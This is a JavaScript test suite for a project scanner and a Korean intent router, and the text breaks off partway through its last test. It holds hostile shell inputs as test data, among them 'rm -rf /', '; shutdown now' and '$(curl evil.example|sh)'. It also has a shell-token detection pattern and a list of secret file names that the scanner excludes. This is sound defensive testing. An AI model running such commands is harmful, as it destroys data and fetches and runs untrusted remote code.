/* WBS-03 facts layer · WBS-06 intent routing · WBS-07 single active Work guard.
 *
 * The scanner is tested against a per-ecosystem fixture matrix (`21` WBS-03 Tests), the router
 * against the corpus shapes the Canon evidence names (q02 §4), and the guard against the
 * engine's own refusal.
 */
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const R = path.resolve(__dirname, '..');
const { code: srcOf } = require(path.join(__dirname, 'src.js'));

/* One helper for the whole suite — see tests/tmp.js. Eight private copies each cleaned up
 * only in `process.on('exit')`, which a killed run never reaches; the leftovers filled the
 * tmpfs and made the suite flaky in a different place every run. */
const { tempDir } = require(path.join(__dirname, 'tmp.js'));

const { scan, MAX_FILES, MAX_MANIFEST_BYTES, READ_CEILING_BYTES, TREE_DEPTH, isSecret } =
  require(path.join(R, 'app/main/interpret/scan.js'));
const { answers, statusOf } = require(path.join(R, 'app/main/interpret/answers.js'));
const { classify, normalize } = require(path.join(R, 'app/main/router/intent.js'));
const { openDb } = require(path.join(R, 'app/main/db/db.js'));
const repo = require(path.join(R, 'app/main/db/repo.js'));

/** Build a project on disk from a {relative path: contents} map. */
function fixture(files) {
  const dir = tempDir('juqode-fix-');
  for (const [rel, body] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, body);
  }
  return dir;
}
const kinds = (a) => Object.fromEntries(a.map((x) => [x.q, x.kind]));

/* ───────────────────────── WBS-03 · the ecosystem matrix ───────────────────────── */

const ECOSYSTEMS = [
  ['Node.js', { 'package.json': JSON.stringify({ name: 'n', scripts: { dev: 'vite', build: 'vite build' }, dependencies: { vite: '^5' } }), 'package-lock.json': '{}' }, 'npm', { name: 'n', deps: ['vite'] }],
  ['Python',  { 'pyproject.toml': '[project]\nname = "p"\n\n[project.dependencies]\nrequests = "*"\n' }, null, { name: 'p', deps: ['requests'] }],
  ['Python',  { 'requirements.txt': 'requests==2.31.0\n# a comment\nflask>=3\n' }, null, { deps: ['flask', 'requests'] }],
  ['Rust',    { 'Cargo.toml': '[package]\nname = "r"\n\n[dependencies]\nserde = "1"\n', 'Cargo.lock': '' }, 'cargo', { name: 'r', deps: ['serde'] }],
  ['Go',      { 'go.mod': 'module example.com/g\n\nrequire (\n\tgithub.com/x/y v1.2.3\n)\n', 'go.sum': '' }, 'go', { name: 'example.com/g', deps: ['github.com/x/y'] }],
  ['Ruby',    { Gemfile: "source 'https://rubygems.org'\n" }, null, { deps: [] }],
];

for (const [eco, files, pm, expect] of ECOSYSTEMS) {
  test(`facts layer recognises a ${eco} project (${Object.keys(files)[0]})`, () => {
    const s = scan(fixture(files));
    assert.deepStrictEqual(s.facts.ecosystems, [eco]);
    assert.strictEqual(s.facts.lockfiles[0]?.pm ?? null, pm);
    const a = answers(s);
    assert.strictEqual(a.find((x) => x.q === 3).confidence, 'confirmed',
      '쓰인 기술 must be 확인됨 when a manifest proves it');
    /* A source_ref must NAME A FILE THE SCAN TOUCHED. Truthiness alone let an answer cite a
     * file that was never opened, which is the chip promising evidence that does not exist. */
    for (const a3 of a.filter((x) => x.confidence === 'confirmed' && x.sourceRef !== 'scan')) {
      for (const ref of a3.sourceRef.split(' · ')) {
        assert.ok(s.readFiles.includes(ref) || s.facts.lockfiles.some((l) => l.file === ref) || ref === 'tree:1',
          `q${a3.q} cites ${ref}, which the scan never touched`);
      }
    }
    if (expect) {
      assert.deepStrictEqual(s.facts.manifests[0].deps, expect.deps, `${eco}: dependencies`);
      if ('name' in expect) assert.strictEqual(s.facts.manifests[0].name, expect.name, `${eco}: manifest name`);
      /* …and the ANSWER must carry them too. Asserting only the scan let the answer drop them. */
      const tech = a.find((x) => x.q === 3).data;
      assert.deepStrictEqual(tech.deps, expect.deps.slice(0, 12), `${eco}: the answer lost the dependencies`);
      assert.strictEqual(tech.depCount, expect.deps.length, `${eco}: the answer lost the dependency count`);
      assert.strictEqual(tech.name, 'name' in expect ? expect.name : null);
    }
  });
}

test('a project with no manifest confirms nothing about its technology', () => {
  const s = scan(fixture({ 'notes.txt': 'hello' }));
  const a = answers(s);
  assert.deepStrictEqual(s.facts.ecosystems, []);
  assert.strictEqual(a.find((x) => x.q === 3).kind, 'no-manifest');
  assert.strictEqual(a.find((x) => x.q === 3).confidence, 'unconfirmed');
  assert.strictEqual(a.find((x) => x.q === 5).kind, 'no-scripts',
    'the way to run a project must never be invented');
});

test('only scripts the project declares become 실행 방법', () => {
  const s = scan(fixture({
    'package.json': JSON.stringify({ scripts: { dev: 'vite', lint: 'eslint .' } }),
    'pnpm-lock.yaml': '',
  }));
  const run = answers(s).find((x) => x.q === 5);
  assert.deepStrictEqual(run.data.scripts.map((x) => x.name), ['dev'], 'only runnable scripts');
  assert.strictEqual(run.data.scripts[0].command, 'pnpm run dev', 'the runner comes from the lockfile');
  assert.match(run.sourceRef, /pnpm-lock\.yaml/, 'the lockfile must be named as evidence for the runner');
});

test('with no lockfile the package manager is NOT guessed', () => {
  const s = scan(fixture({ 'package.json': JSON.stringify({ scripts: { dev: 'vite' } }) }));
  const a = answers(s);
  const run = a.find((x) => x.q === 5);
  assert.strictEqual(run.data.pm, null, 'package.json proves the script, never the runner');
  assert.strictEqual(run.data.scripts[0].command, null,
    'rendering `npm run dev` from no evidence is a claim the source_ref cannot support');
  assert.strictEqual(a.find((x) => x.q === 3).data.packageManager, null);
});

test('폴더가 하는 일 is 확인 못함 — the question is the role, and nothing established it', () => {
  const s = scan(fixture({ 'package.json': '{"name":"f"}', 'src/a.js': '1', 'lib/b.js': '2' }));
  const a = answers(s);
  const folders = a.find((x) => x.q === 4);
  assert.strictEqual(folders.confidence, 'unconfirmed',
    'D-114: a 확인됨 chip on this row would certify an answer nothing has given');
  assert.strictEqual(folders.sourceRef, null);
  assert.deepStrictEqual(folders.data.dirs, ['lib', 'src'], 'the listing is still carried as context');
  assert.ok(a.find((x) => x.q === 6).data.questions.includes('folder-roles'),
    '확인 못한 것 must list the folder roles, or the card contradicts itself');
});

test('확인 못한 것 lists every unanswered sub-claim, not only the empty questions', () => {
  const s = scan(fixture({ 'package.json': JSON.stringify({ scripts: { dev: 'v' } }), 'src/a.js': '1', 'package-lock.json': '{}' }));
  const unknown = answers(s).find((x) => x.q === 6).data.questions;
  /* 11 F-C1-02 ③ asks two things of 쓰인 기술; only the first is deterministic. */
  assert.ok(unknown.includes('tech-meaning'), 'the meaning half of 쓰인 기술 is unanswered and must be listed');
  assert.ok(unknown.includes('folder-roles'));
  assert.ok(unknown.includes('what') && unknown.includes('features'));
});

test('secrets never enter the walk at all', () => {
  /* This assertion set used to be structurally incapable of failing: `scan()` returns no
   * per-file listing, so "the marker is not in the result" and "readFiles has no .env" were
   * true even with the exclusion deleted outright. Deleting SECRET passed. What CAN differ is
   * `fileCount` and the source hash — a secret that is walked is counted and hashed. */
  /* The directories exist in the BASELINE too, so the only thing the second scan adds is the
   * secret FILES. A new folder legitimately ages the Brief, and that would mask the check. */
  const dir = fixture({ 'package.json': '{"name":"s"}', 'certs/.keep': '', 'deep/deeper/.keep': '' });
  const base = scan(dir);
  assert.strictEqual(base.facts.fileCount, 3, 'baseline is the manifest and two placeholders');
  const baseHash = base.sourceHash;

  const SECRETS = {
    '.env': 1, '.ENV': 1, '.env.local': 1, '.envrc': 1, '.env-production': 1,
    'server.pem': 1, 'deploy.KEY': 1, 'id_rsa': 1, 'id_rsa.pub': 1, 'id_ed25519': 1,
    'id_ecdsa': 1, 'prod.p12': 1, 'prod.pfx': 1,
    'certs/nested.pem': 1, 'deep/deeper/.env.local': 1,       // at every depth, not just the top
  };
  for (const rel of Object.keys(SECRETS)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, 'juqode-synthetic-fixture-marker');
  }

  const s = scan(dir);
  assert.strictEqual(s.facts.fileCount, 3,
    `${s.facts.fileCount - 3} secret file(s) were walked and counted`);
  assert.deepStrictEqual(s.facts.tree, base.facts.tree,
    `a secret entered the file listing: ${s.facts.tree.filter((t) => !base.facts.tree.includes(t))}`);
  assert.strictEqual(s.sourceHash, baseHash,
    'a secret entered the tree listing and changed the project\'s identity hash');
  assert.deepStrictEqual(s.readFiles, ['package.json']);
  assert.ok(!JSON.stringify(s).includes('juqode-synthetic-fixture-marker'));
});

test('the exclusion list is checked directly, name by name', () => {
  for (const n of Object.keys({
    '.env': 1, '.ENV': 1, '.env.local': 1, '.env.production': 1, '.envrc': 1, '.env-prod': 1,
    'a.pem': 1, 'a.PEM': 1, 'a.key': 1, 'a.p12': 1, 'a.pfx': 1, 'a.jks': 1,
    'id_rsa': 1, 'id_rsa.pub': 1, 'id_dsa': 1, 'id_ecdsa': 1, 'id_ed25519': 1,
  })) assert.ok(isSecret(n), `${n} is not excluded — 19 §C1 ④ / D-126a say .env* and key material`);

  for (const n of ['package.json', 'README.md', 'environment.ts', 'keyboard.js', 'monkey.js', 'envelope.md']) {
    assert.ok(!isSecret(n), `${n} is not a secret and must still be read`);
  }
});

test('a symlinked manifest is NEVER opened — it can point anywhere on the disk', () => {
  const outside = tempDir('juqode-outside-');
  const secret = path.join(outside, 'private');
  fs.writeFileSync(secret, 'juqode-synthetic-fixture-marker BEGIN OPENSSH PRIVATE KEY');

  const dir = fixture({ 'package.json': '{"name":"p"}' });
  for (const name of ['requirements.txt', 'README.md', 'Cargo.toml', 'go.mod', 'pyproject.toml']) {
    fs.symlinkSync(secret, path.join(dir, name));
  }
  const s = scan(dir);
  const blob = JSON.stringify(s) + JSON.stringify(answers(s));
  assert.ok(!blob.includes('juqode-synthetic-fixture-marker'),
    'a symlinked manifest was read — readFileSync follows links, so the walk must gate the read');
  assert.deepStrictEqual(s.readFiles, ['package.json'], `read ${s.readFiles} — only real files may be opened`);
  assert.strictEqual(s.facts.readme, null, 'a symlinked README was read');
});

test('a file whose NAME is on the secret list is never opened, whatever else it looks like', () => {
  /* `/^readme/i` matches `readme.key`. The README reader used to take its candidate from a
   * raw name set that predated the secret check. */
  const dir = fixture({
    'package.json': '{"name":"p"}',
    'readme.key': 'juqode-synthetic-fixture-marker in a secret-named readme',
    'readme.pem': 'juqode-synthetic-fixture-marker',
  });
  const s = scan(dir);
  assert.ok(!JSON.stringify(s).includes('juqode-synthetic-fixture-marker'));
  assert.deepStrictEqual(s.readFiles, ['package.json']);
});

test('a DIRECTORY named .env is excluded too, and never reaches the Brief', () => {
  const dir = fixture({ 'package.json': '{"name":"p"}', '.env/inner.txt': 'juqode-synthetic-fixture-marker', 'src/a.js': '1' });
  const s = scan(dir);
  assert.deepStrictEqual(s.facts.topDirs, ['src'], '.env/ was listed as a project folder');
  assert.ok(!JSON.stringify(s).includes('.env'));
});

test('a manifest cannot freeze the main process', () => {
  const { MAX_MANIFEST_BYTES } = require(path.join(R, 'app/main/interpret/scan.js'));
  /* The old `/^\s*name\s*=…/m` form was O(lines × bytes): 44.9 s on this shape, with the
   * window dead throughout because scan() runs synchronously inside the interpret handler. */
  const dir = fixture({ 'pyproject.toml': '  \n'.repeat(220_000) });
  const t0 = Date.now();
  const s = scan(dir);
  const took = Date.now() - t0;
  assert.ok(took < 3000, `scanning a pathological manifest took ${took} ms`);
  assert.deepStrictEqual(s.facts.ecosystems, ['Python'], 'the ecosystem is still established');
  assert.ok(MAX_MANIFEST_BYTES < 1024 * 1024, 'a manifest read must be capped');
});

test('one large asset does not blind the stale signal', () => {
  /* The byte budget used to count the size of files that were only LISTED, so a single 6 MB
   * asset exhausted it and `source_hash` stopped responding to the project at all. */
  const dir = fixture({ 'package.json': '{"name":"b"}', 'assets/clip.mp4': 'x'.repeat(6 * 1024 * 1024) });
  const first = scan(dir).sourceHash;
  fs.mkdirSync(path.join(dir, 'newfolder'));
  assert.notStrictEqual(scan(dir).sourceHash, first,
    'the project changed and the stale signal did not move');
});

test('content below the depth cap is reported, not silently dropped', () => {
  const s = scan(fixture({ 'package.json': '{"name":"d"}', 'a/b/c/d/deep.txt': '1' }));
  assert.ok(s.skipped?.depthLimited?.length, 'a folder below the depth cap left no trace');
  assert.ok(answers(s).find((x) => x.q === 6).data.depthLimited.length,
    '확인 못한 것 must carry what the depth cap did not look at');
});

test('a malformed manifest degrades to an absent fact, never a crash or a guess', () => {
  for (const body of ['[]', 'null', '"a string"', '{"scripts":"npm test"}', '{"dependencies":[1,2]}', 'not json']) {
    const s = scan(fixture({ 'package.json': body }));
    assert.deepStrictEqual(s.facts.ecosystems, ['Node.js'], `${body}: the manifest still proves the ecosystem`);
    const run = answers(s).find((x) => x.q === 5);
    assert.ok(run.kind === 'no-scripts' || run.data.scripts.length > 0);
    if (body === '{"scripts":"npm test"}') {
      assert.strictEqual(run.kind, 'no-scripts', 'a string `scripts` spread into characters and became eight scripts');
    }
  }
});

test('an answer keeps its KIND across the store — the reason is not erased', () => {
  const db = openDb(':memory:');
  const p = repo.openProject(db, '/k', 'k');
  const s = scan(fixture({ 'notes.txt': 'no manifest here' }));
  const a = answers(s);
  const saved = repo.saveInterpretation(db, p.id, { status: statusOf(s, a), sourceHash: s.sourceHash, answers: a, readFiles: s.readFiles });
  const got = kinds(saved.answers);
  assert.strictEqual(got[3], 'no-manifest', 'the reason an answer is missing must survive the round trip');
  assert.strictEqual(got[4], 'no-folders');
  assert.strictEqual(got[5], 'no-scripts');
  assert.deepStrictEqual(kinds(repo.currentInterpretation(db, p.id).answers), got, 'and again on reload');
  db.close();
});

test('generated and vendored directories are skipped, and the skip is reported', () => {
  const dir = fixture({
    'package.json': '{"name":"s"}',
    'node_modules/big/index.js': 'x'.repeat(500),
    'dist/bundle.js': 'y'.repeat(500),
    'src/app.js': 'z',
  });
  const s = scan(dir);
  assert.ok(!s.facts.topDirs.includes('node_modules'));
  assert.ok(s.facts.excludedDirs.includes('node_modules') && s.facts.excludedDirs.includes('dist'),
    '19 §C1 ③: what was not read is reported, never silently dropped');
  const unknown = answers(s).find((x) => x.q === 6);
  /* A permanent exclusion is POLICY, not a gap. Listing it under 확인 못한 것 would tell the
   * user something is missing when nothing is. */
  assert.deepStrictEqual(unknown.data.unreadableDirs, [],
    'a policy exclusion must not be reported as a directory we failed to read');
  assert.ok(unknown.data.excludedDirs.includes('node_modules'));
});

test('an excluded directory is reported at any depth, not just the top', () => {
  const s = scan(fixture({
    'package.json': '{"name":"n"}',
    'packages/inner/node_modules/x.js': '1',
    'packages/inner/src/a.js': '2',
  }));
  assert.ok(s.facts.excludedDirs.some((d) => d.endsWith('node_modules')),
    'a nested excluded folder disappeared from the record entirely');
});

test('a directory the OS refuses is a real gap, and is reported as one', { skip: process.getuid?.() === 0 && 'root' }, () => {
  const dir = fixture({ 'package.json': '{"name":"n"}', 'locked/inner.txt': 'x' });
  fs.chmodSync(path.join(dir, 'locked'), 0o000);
  try {
    const s = scan(dir);
    assert.ok(s.skipped.unreadableDirs.includes('locked'), 'an unreadable directory was not reported');
    assert.ok(answers(s).find((x) => x.q === 6).data.unreadableDirs.includes('locked'));
    assert.ok(!s.facts.excludedDirs.includes('locked'), 'a refused read is not a policy exclusion');
  } finally { fs.chmodSync(path.join(dir, 'locked'), 0o700); }
});

test('the budget is the one Canon names, and the read ceiling is below it by construction', () => {
  /* Pinned to the numbers, not to the constants: a fixture sized from the constant under test
   * adapts to whatever the constant becomes, and `MAX_FILES = Infinity` made such a loop HANG
   * the suite rather than fail it. */
  assert.strictEqual(MAX_FILES, 2000, '19 §C1 ③ names 2,000 files');
  assert.ok(MAX_MANIFEST_BYTES <= 1024 * 1024, 'a single manifest read must be capped');
  assert.ok(READ_CEILING_BYTES < 5 * 1024 * 1024,
    `this layer can read up to ${READ_CEILING_BYTES} bytes; 19 §C1 ③ allows 5 MB. If the ceiling ever ` +
    'exceeds the budget, the budget has to become a real gate rather than a fact about the design.');
});

test('the file listing is sorted, so the project identity does not depend on readdir order', () => {
  const s = scan(fixture({ 'package.json': '{"n":1}', 'z/9.js': '', 'a/1.js': '', 'm/5.js': '' }));
  assert.deepStrictEqual(s.facts.tree, [...s.facts.tree].sort(),
    'the tree is unsorted, so the source hash depends on the order the OS happened to return');
});

test('a huge project is capped, and says how much it did not read', () => {
  const files = { 'package.json': '{"name":"h"}' };
  for (let i = 0; i < 2040; i++) files[`f/${i}.txt`] = 'x';   // literal, so the cap cannot move it
  const s = scan(fixture(files));
  assert.ok(s.skipped && s.skipped.files > 0, 'the file cap did not engage');
  assert.strictEqual(s.facts.fileCount, 2000, `counted ${s.facts.fileCount} files, the cap is 2000`);
  assert.ok(answers(s).find((x) => x.q === 6).data.skippedFiles > 0,
    '확인 못한 것 must carry what the cap cut off');
});

test('a failed scan confirms nothing, and says which errno it was', () => {
  /* The chmod-based test below is the only place the failure path used to be asserted, and it
   * SKIPS as root — the CI default — taking `statusOf`, `scanFailed` and the whole
   * empty-facts path with it. This one cannot skip. */
  const failed = {
    facts: { manifests: [], topDirs: [], scripts: [], lockfiles: [], ecosystems: [], excludedDirs: [] },
    readFiles: [], sourceHash: null, skipped: null, failed: 'EACCES',
  };
  const a = answers(failed);
  assert.strictEqual(statusOf(failed, a), 'failed');
  assert.strictEqual(a.find((x) => x.q === 6).data.scanFailed, 'EACCES',
    'the Brief must be able to say which errno stopped the scan');
  assert.ok(a.every((x) => x.q === 6 || x.confidence !== 'confirmed'),
    'a failed scan must confirm nothing about the project');
});

test('partial is the only non-failed status the facts layer can reach today', () => {
  /* q1 · q2 · q4 are unconditionally 확인 못함 until WBS-04, so `interpreted` is unreachable.
   * Stating it here means the day it becomes reachable, this test says so. */
  const s = scan(fixture({ 'package.json': '{"name":"p","scripts":{"dev":"v"}}', 'package-lock.json': '{}', 'src/a.js': '1' }));
  assert.strictEqual(statusOf(s, answers(s)), 'partial');
});

test('an unreadable project root is a read failure, not a crash or a guess', { skip: process.getuid?.() === 0 && 'root' }, () => {
  const dir = fixture({ 'package.json': '{}' });
  fs.chmodSync(dir, 0o000);
  try {
    const s = scan(dir);
    assert.strictEqual(s.failed, 'EACCES');
    const a = answers(s);
    assert.strictEqual(statusOf(s, a), 'failed');
    assert.ok(a.every((x) => x.q === 6 || x.confidence !== 'confirmed'),
      'a failed scan must confirm nothing about the project');
  } finally { fs.chmodSync(dir, 0o700); }
});

test('the source hash changes when the project changes, and not otherwise', () => {
  const dir = fixture({
    'package.json': JSON.stringify({ name: 'a', dependencies: { x: '1' } }),
    'README.md': 'first draft',
  });
  const first = scan(dir).sourceHash;
  assert.strictEqual(scan(dir).sourceHash, first, 'the same project hashed differently twice');

  fs.writeFileSync(path.join(dir, 'README.md'), 'a completely rewritten description');
  assert.strictEqual(scan(dir).sourceHash, first,
    'rewriting prose is not a change to what the project IS (19 §C1 ⑤ hashes manifests + tree)');

  fs.mkdirSync(path.join(dir, 'newfolder'));
  assert.notStrictEqual(scan(dir).sourceHash, first, 'a new top-level folder must age the Brief');
  fs.rmdirSync(path.join(dir, 'newfolder'));

  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'a', dependencies: { x: '1', y: '2' } }));
  assert.notStrictEqual(scan(dir).sourceHash, first, 'a new dependency must age the Brief');
});

test('the source hash does not depend on the order files were created', () => {
  /* Scanning the same directory twice hits the same readdir order, so a dropped sort was
   * invisible. Two directories built in opposite insertion order is the real test. */
  const forward = fixture({ 'package.json': '{"name":"o"}', 'a/1.js': '', 'b/2.js': '', 'c/3.js': '' });
  const backward = fixture({ 'c/3.js': '', 'b/2.js': '', 'a/1.js': '', 'package.json': '{"name":"o"}' });
  assert.strictEqual(scan(forward).sourceHash, scan(backward).sourceHash,
    'the same project hashed differently depending on creation order');
});

test('KNOWN LIMIT: a change deeper than the tree cap does not age the Brief', () => {
  /* Not a defect — `19` §C1 ① caps the tree at depth 3 — but it IS a limit on staleness, and
   * WBS-05 will announce staleness from this hash. Written down so it is a decision. */
  assert.strictEqual(TREE_DEPTH, 3);
  const dir = fixture({ 'package.json': '{"name":"z"}', 'a/b/c/leaf.js': '1' });
  const before = scan(dir).sourceHash;
  fs.mkdirSync(path.join(dir, 'a/b/c/d/e'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'a/b/c/d/e/new.js'), '1');
  assert.strictEqual(scan(dir).sourceHash, before,
    'if this now differs, the depth cap changed and WBS-05 staleness got deeper — update the note');
});

test('a symlink is never followed during the walk', () => {
  const outside = tempDir('juqode-out-');
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'juqode-synthetic-fixture-marker');
  const dir = fixture({ 'package.json': '{"name":"l"}' });
  fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(dir, 'linked.txt'));
  fs.symlinkSync(outside, path.join(dir, 'linkeddir'));
  const s = scan(dir);
  assert.strictEqual(s.facts.fileCount, 1, 'a symlinked file was walked');
  assert.deepStrictEqual(s.facts.topDirs, [], 'a symlinked directory was walked into');
  assert.ok(!JSON.stringify(s).includes('juqode-synthetic-fixture-marker'));
});

test('an interpretation is stored once as current, and a reopen finds it', () => {
  const db = openDb(':memory:');
  const p = repo.openProject(db, '/p', 'p');
  const s = scan(fixture({ 'package.json': '{"name":"p","scripts":{"dev":"vite"}}' }));
  const a = answers(s);

  const saved = repo.saveInterpretation(db, p.id, { status: statusOf(s, a), sourceHash: s.sourceHash, answers: a, readFiles: s.readFiles });
  assert.strictEqual(saved.answers.length, 6);
  assert.deepStrictEqual(kinds(saved.answers)[3], 'tech');

  repo.saveInterpretation(db, p.id, { status: 'interpreted', sourceHash: 'other', answers: a, readFiles: [] });
  assert.strictEqual(db.prepare('select count(*) n from interpretation where project_id = ? and is_current').get(p.id).n, 1,
    'interpretation_one_current allows exactly one current row per project');
  assert.strictEqual(db.prepare('select count(*) n from interpretation').get().n, 2,
    'the previous interpretation must be kept, not deleted');
  assert.strictEqual(repo.currentInterpretation(db, p.id).source_hash, 'other');
  db.close();
});

/* ───────────────────────── WBS-06 · intent routing ───────────────────────── */

test('normalisation is the documented one, and it is deterministic', () => {
  assert.strictEqual(normalize('개발 서버 켜줘!ㅋㅋ'), '개발서버켜줘');
  assert.strictEqual(normalize('  Dev  Server 좀 켜줘...  '), 'devserver켜줘');
  assert.strictEqual(normalize('빌드 한번 돌려봐'), '빌드돌려봐');
  /* Different SURFACE forms of the same request must land on the same normalised string.
   * Comparing normalize(s) to normalize(s) was a tautology and asserted nothing. */
  assert.strictEqual(normalize('개발 서버 켜줘'), normalize('개발서버 켜줘!!ㅋㅋㅋ'));
  assert.strictEqual(normalize('빌드 돌려줘'), normalize('  빌드  좀  돌려줘 ... '));
  assert.strictEqual(normalize(''), '');
  assert.strictEqual(normalize(null), '');
});

/* Shapes named in `../evidence/planning/q02-q03-quick-command-validation.md` §4. */
const ROUTES = [
  // technical execution requests → the terminal, never run from this field (D-134)
  ['개발 서버 켜줘', 'terminal', 'qc.dev.start'],
  ['개발서버켜줘!ㅋㅋ', 'terminal', 'qc.dev.start'],
  ['미리보기 올려줘', 'terminal', 'qc.dev.start'],
  ['npm run build', 'terminal', 'qc.build'],
  ['빌드', 'terminal', 'qc.build'],
  ['유닛 테스트 한번 돌려봐', 'terminal', 'qc.test'],
  ['테스트 실행', 'terminal', 'qc.test'],
  ['뭐가 바뀌었어?', 'terminal', 'qc.git.status'],
  ['수정된 파일 확인해줘', 'terminal', 'qc.git.status'],   // 수정 lives inside the OBJECT
  ['콘솔 열어', 'terminal', 'qc.terminal.open'],
  ['셸 열어주세요', 'terminal', 'qc.terminal.open'],
  // change requests → a Claude Code Work
  ['로그인 오류 고쳐줘', 'work'],
  ['테스트 추가해줘', 'work'],
  ['빌드 에러 수정해줘', 'work'],
  ['package.json 에 dev 추가해줘', 'work'],
  // two readings, both shown; JuQode picks neither
  ['서버 좀 정리해줘', 'ambiguous'],
  ['빌드 만들어줘', 'ambiguous'],          // run the build, or write me a build script
  ['개발 서버 정리', 'ambiguous'],
  ['돌려줘', 'ambiguous'],
  ['켜줘', 'ambiguous'],
  ['꺼줘', 'ambiguous'],
  // not readable as a project-change request — a branch, not a failure
  ['배포해줘', 'unrecognized'],
  ['서버 켜고 빌드도 해줘', 'unrecognized'],          // a compound request
  ['서버 다시 켜줘', 'unrecognized'],                 // restart is not an MVP rule
  ['웹서버 켜줘', 'unrecognized'],
  ['npm install', 'unrecognized'],
  ['', 'unrecognized'],
  ['수정된 파일', 'unrecognized'],          // a bare object: no verb, so no rule and no Work
  ['삭제된 파일 보여줘', 'unrecognized'],    // read-only, but not a declared object
  ['요', 'unrecognized'],                  // a polite ending is not a verb
  ['주세요', 'unrecognized'],
  ['  개발 서버 켜줘  ', 'terminal', 'qc.dev.start'],   // surrounding whitespace is normalised away…
];

for (const [input, route, rule] of ROUTES) {
  test(`routing: ${JSON.stringify(input)} → ${route}${rule ? ` (${rule})` : ''}`, () => {
    const r = classify(input);
    assert.strictEqual(r.route, route, `got ${route === r.route ? '' : r.route} · tier ${r.tier}`);
    if (rule) assert.strictEqual(r.rule, rule);
    // …but the words themselves are returned exactly as typed, whitespace included.
    assert.strictEqual(r.text, input, 'the user\'s words must come back unchanged');
  });
}

test('the TIER says which pass answered, and the synonym pass is really second', () => {
  /* FOUND BY MUTATION: `pass === 'direct'` appears twice — once to decide whether synonyms are
   * applied and once to label the tier — and both could be inverted with the whole suite
   * passing. The corpus above asserts the ROUTE and prints the tier in its failure message;
   * nothing ever asserted it.
   *
   * The tier is not decoration. `20` records it with the run, and `19` §C4 leaves synonym
   * detection UNVALIDATED — so which pass answered is exactly the thing a wrong guess has to be
   * traceable through afterwards. */
  assert.strictEqual(classify('서버 켜줘').tier, 'pattern',
    'a phrase that matches directly was credited to the synonym pass');
  assert.strictEqual(classify('dev 서버 켜줘').tier, 'synonym+pattern',
    'a phrase that only matches after substitution was credited to the direct pass');
  assert.strictEqual(classify('npm run dev').tier, 'synonym+pattern');
  /* Both reach the same rule — the tier is the only thing that separates them. */
  assert.strictEqual(classify('서버 켜줘').rule, classify('dev 서버 켜줘').rule);
  /* …and the exact form is labelled as exact, on whichever pass found it. */
  assert.match(classify('  개발 서버 켜줘  ').tier, /^pattern/);
});

test('tail stripping repeats until nothing is left to strip', () => {
  /* FOUND BY MUTATION: the `do … while (s !== prev)` loop could exit after ONE pass and every
   * test still passed, because the corpus's noisy inputs all clear in one round —
   * `켜줘!!ㅋㅋ` strips its punctuation and then its laughter and is done.
   *
   * ALTERNATING tails need the loop: `켜줘!ㅋ!` is punctuation, laughter, punctuation, and one
   * pass leaves `켜줘!`, which matches no rule. q02 §2 puts the loop there for exactly this. */
  const plain = classify('켜줘');
  const noisy = classify('켜줘!ㅋ!');
  assert.strictEqual(noisy.route, plain.route,
    `켜줘!ㅋ! routed as ${noisy.route} while 켜줘 routed as ${plain.route}`);
  assert.deepStrictEqual(noisy.options, plain.options);
  /* …and `normalize` itself gets there, which is the function the loop is in. */
  assert.strictEqual(normalize('켜줘!ㅋ!'), normalize('켜줘'));
  assert.strictEqual(normalize('돌려줘~ㅎ~ㅋ.'), normalize('돌려줘'));
});

test('no rule token is shell-shaped — the table itself cannot be poisoned', () => {
  /* The dangerous-input list below is thirteen hand-picked strings, so adding `rm` to a rule's
   * verbs was invisible to it. The property the title claims is structural, so check it
   * structurally: nothing in the table may be a shell fragment or a change verb. */
  const { RULES, CHANGE_FORMS } = require(path.join(R, 'app/main/router/rules.js'));
  const SHELL = /[;&|$`><\\/]|--|\brm\b|\bsudo\b|\bcurl\b|\bchmod\b/i;
  for (const r of RULES) {
    for (const tok of [...r.verbs, ...(r.ambiguousVerbs ?? []), ...r.objects, ...(r.exact ?? [])]) {
      assert.ok(!SHELL.test(tok), `rule ${r.id} carries a shell-shaped token: ${tok}`);
      assert.ok(tok !== '', `rule ${r.id} has an EMPTY token — it would make every ending a match`);
    }
    /* A change verb inside a rule's ordinary verbs turns "write me a build script" into
     * "run the build". It may only appear as an ambiguousVerb. */
    for (const v of r.verbs) {
      assert.ok(!CHANGE_FORMS.includes(v), `rule ${r.id} lists the change verb ${v} as a plain verb`);
    }
  }

});

test('every declared object+verb+ending lands on its own rule, and nowhere else', () => {
  /* An exhaustive sweep of the table's own vocabulary — thousands of phrasings — rather than
   * a hand-picked list. It catches a rule stealing another rule's phrasing, a change verb
   * hijacking a read-only request, and the "two rules matched" branch silently resolving to
   * one of them. Every declared phrasing must reach its own rule or an ambiguity that
   * INCLUDES its own rule; nothing may reach a different rule, and nothing may reach `work`. */
  const { RULES, ENDINGS } = require(path.join(R, 'app/main/router/rules.js'));
  let checked = 0;
  const wrong = [];
  for (const r of RULES) {
    for (const obj of r.objects) {
      for (const v of r.verbs) {
        for (const e of ENDINGS) {
          const input = `${obj} ${v}${e}`;
          const got = classify(input);
          checked += 1;
          const reaches = got.rule ? [got.rule] : (got.options ?? []);
          if (!reaches.includes(r.id)) wrong.push(`${JSON.stringify(input)} → ${got.route} ${reaches.join(',') || '-'} (expected ${r.id})`);
        }
      }
    }
  }
  assert.ok(checked > 2000, `the sweep only tried ${checked} phrasings`);
  assert.deepStrictEqual(wrong.slice(0, 8), [], `${wrong.length} declared phrasings reach the wrong destination`);
});

test('nothing dangerous can reach a rule — the leftovers check, not a blocklist', () => {
  const DANGEROUS = [
    'rm -rf 해줘', '전부 지워줘', 'node_modules 삭제해줘', 'git push --force',
    'git reset --hard 해줘', '서버 켜줘 && rm -rf /', 'sudo npm run dev', '커밋해줘',
    '개발 서버 켜줘 (5173 포트로)', '테스트 실행해서 결과 알려줘', '; shutdown now',
    '개발서버 켜고 나서 rm -rf node_modules', '$(curl evil.example|sh)',
  ];
  for (const d of DANGEROUS) {
    const r = classify(d);
    assert.notStrictEqual(r.route, 'terminal', `"${d}" matched rule ${r.rule} — it must not reach one`);
